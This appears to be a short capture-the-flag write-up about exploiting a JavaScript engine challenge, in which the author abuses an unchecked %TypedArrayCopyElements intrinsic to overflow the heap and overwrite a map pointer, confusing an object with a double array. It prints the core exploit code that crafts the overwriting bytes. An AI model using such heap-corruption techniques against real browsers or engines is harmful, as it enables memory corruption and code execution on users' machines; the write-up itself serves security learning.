In this challenge I abused heap overflow with `%TypedArrayCopyElements` that didn't check the bounds.

Luckily, during CONFIDENCE CTF i didn't notice you could use clean OOB write and decided to go with heap overflow to make confusion between map and array with doubles.
So once I confused the object, i just copied the exploit I used before ;)

The "meat" of the exploit is shown below:

```
var w = new Uint8Array(10);
var z = new Uint8Array(1000);

var sice_obj = {"a":0x100.smi2f(),"b":BigInt(0x13377331).i2f(),"c":BigInt(0x13377331).i2f(),"d":BigInt(0x13377331).i2f()}

z.fill(0x91,0,1000);
z[197] = 0x18; // two lower bytes dictate the type of the object (it's a map ptr)
z[196] = 0x91;
//%DebugPrint(sice_obj);


%TypedArrayCopyElements(w,z,198);
```
